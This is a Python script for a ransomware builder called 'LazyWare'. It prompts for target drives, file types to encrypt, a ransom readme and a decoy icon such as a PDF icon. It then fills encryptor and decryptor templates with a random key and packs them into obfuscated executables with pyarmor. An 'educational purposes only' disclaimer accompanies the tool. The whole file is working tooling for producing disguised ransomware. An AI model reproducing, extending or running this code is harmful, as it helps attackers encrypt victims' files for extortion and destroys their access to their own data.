
import os
import platform
import base64
import datetime
import shutil
from colorama import Fore

red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
white = Fore.WHITE


class Generator:
    def __init__(self):
        self.configuration = {}
        self.configuration['key'] = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8')
        self.configuration['disk'] = []
        self.configuration['fname'] = ""
        self.configuration['ext'] = ""
        self.configuration['icon'] = ""
        self.configuration['t_ext'] = []
        self.configuration['readme'] = ""

        self.interact()

        self.createFile()

    def clear(self):
        operating_system = platform.system()
        if "indows" in operating_system:
            os.system("cls")  
        elif "inux" in operating_system:
            os.system("clear")
        else:
            pass


        print(f"""{red}
       @@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@
   @@@@@@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@/      \@@@/   @
@@@@@@@@@@@@@@@@\      @@  @___@    
@@@@@@@@@@@@@ @@@@@@@@@@  | \@@@@@
@@@@@@@@@@@@@ @@@@@@@@@\__@_/@@@@@
 @@@@@@@@@@@@@@@/,/,/./'/_|.\'\,\\
   @@@@@@@@@@@@@|  | | | | | | | |
        ver 2.0  \_|_|_|_|_|_|_|_|

{white}LazyWare - Simple Ransomware Generator 
    by {red}@justakazh

{white}({red}*{white}) Disclaimer {white} : This tool is for educational purposes only! I am not responsible for any harmful actions taken with this tool. Use responsibly!

""")
        
    
    def interact(self):
        self.clear()

        # target disk / dir
        print(f"[{red}REQUIRED{white}] Insert disk or target folder\nexample: E:,D:,C:\\users\\Administrator\\Documents\n")
        tdisk = str(input("-> "))
        self.configuration['disk'] = tdisk.split(",")

        self.clear()

        # Ransom name
        print(f"[{red}REQUIRED{white}] Insert Filename\nexample: prize\n")
        self.configuration['fname'] = str(input("-> "))

        # Extension
        print(f"[{red}REQUIRED{white}] Insert extension for encrypted files\nwhen file encrypted, there will be automaticly change the extension data.docx to data.docx.your_extension\nexample: .encrypted")
        self.configuration['ext'] = str(input("-> "))

        self.clear()

        # Icon
        print(f"[{red}REQUIRED{white}] Insert Icon\nexample: icons/pdf.ico\n")
        self.configuration['icon'] = str(input("-> "))

        self.clear()

        # Target extension
        print(f"[{red}REQUIRED{white}] Insert target file extension\nexample: .docx,.pdf,.jpg,.mp4\n")
        target_ext = str(input("-> "))
        self.configuration['t_ext'] = target_ext.split(",")

        self.clear()

        # Readme
        print(f"[{red}REQUIRED{white}] Insert readme file\nexample: lib/readme.txt\n")
        r_in = str(input("-> "))

        # Cek apakah file readme ada sebelum membacanya
        if os.path.exists(r_in):
            self.configuration['readme'] = open(r_in, "r").read()
        else:
            print(f"[{red}ERROR{white}] File readme tidak ditemukan! Pastikan file pathnya benar.")
            exit(1)  # Hentikan program jika file tidak ditemukan

    def createFile(self):
        pwd = os.getcwd()
        date = str(datetime.datetime.now().date())
        fout = os.path.join(pwd, "output", date)
        f_encryptor = os.path.join(fout, self.configuration['fname'] + ".py")
        f_decryptor = os.path.join(fout, "decryptor_" + self.configuration['fname'] + ".py")

        try:
            os.makedirs(fout, exist_ok=True)  # Membuat direktori jika belum ada
        except Exception as e:
            print(f"[{red}ERROR{white}] Gagal membuat direktori: {e}")
            exit(1)  # Hentikan program jika gagal membuat direktori

        # GENERATE ENCRYPTOR
        with open("lib/source.py", "r") as f:
            read = f.read()
            cofig = read.replace("##key##", self.configuration['key'])
            cofig = cofig.replace("##disk##", str(self.configuration['disk']))
            cofig = cofig.replace("##enc_extension##", str(self.configuration['ext']))
            cofig = cofig.replace("##file_to_enc##", str(self.configuration['t_ext']))
            cofig = cofig.replace("##readme##", str(self.configuration['readme']))
            open(f_encryptor, "w").write(cofig)

        # GENERATE DE-ENCRYPTOR
        with open("lib/source_de.py", "r") as f:
            read = f.read()
            cofig = read.replace("##key##", self.configuration['key'])
            cofig = cofig.replace("##disk##", str(self.configuration['disk']))
            cofig = cofig.replace("##enc_extension##", str(self.configuration['ext']))
            cofig = cofig.replace("##file_to_enc##", str(self.configuration['t_ext']))
            open(f_decryptor, "w").write(cofig)

        # GENERATE KEY
        open(os.path.join(fout, "KEY.txt"), "w").write(self.configuration['key'])

        # FOR ENCRYPTOR
        # init pyarmor config
        os.system(f"pyarmor gen --pack onefile {f_decryptor} --output {fout}")
        
        # Perbaikan perintah pyarmor
        pyarmor_command = f"pyarmor cfg pack:pya_options --icon {self.configuration['icon']} --target-architecture universal2"
        os.system(pyarmor_command)  # Pastikan tidak ada argumen yang salah
        os.system(f"pyarmor gen --pack onefile {f_encryptor} --output {fout}")

        # Pastikan file .spec ada sebelum mencoba menghapusnya
        spec_file_encryptor = os.path.join(fout, f"{self.configuration['fname']}.spec")
        spec_file_decryptor = os.path.join(fout, f"decryptor_{self.configuration['fname']}.spec")

        # Periksa apakah file .spec ada sebelum menghapus
        if os.path.exists(spec_file_encryptor):
            os.remove(spec_file_encryptor)
        else:
            print(f"[{red}ERROR{white}] File {spec_file_encryptor} tidak ditemukan.")

        if os.path.exists(spec_file_decryptor):
            os.remove(spec_file_decryptor)
        else:
            print(f"[{red}ERROR{white}] File {spec_file_decryptor} tidak ditemukan.")

        # Cek apakah folder dist ada sebelum mencoba menghapusnya
        dist_folder = os.path.join(pwd, "dist")
        if os.path.exists(dist_folder):
            shutil.rmtree(dist_folder)
        else:
            print(f"[{red}ERROR{white}] Folder {dist_folder} tidak ditemukan.")

        shutil.rmtree("./.pyarmor")

        # KEY
        self.clear()
        print("""
\n\n\n
\t\t """ + red + """KEY 	: """ + green + self.configuration['key'] + """
\t\t """ + red + """Output : """ + green + fout + red + """ 
\n\t\t """ + yellow + """Please dont lose the KEY !
""" + white)


Generator()


# VGhlIHdvcnN0IGZlZWxpbmcgaXMgd2hlbiB5b3UgZG9uJ3QgZXZlbiBrbm93IHRmIHlvdSdyZSBmZWVsaW5nCgoKCgo=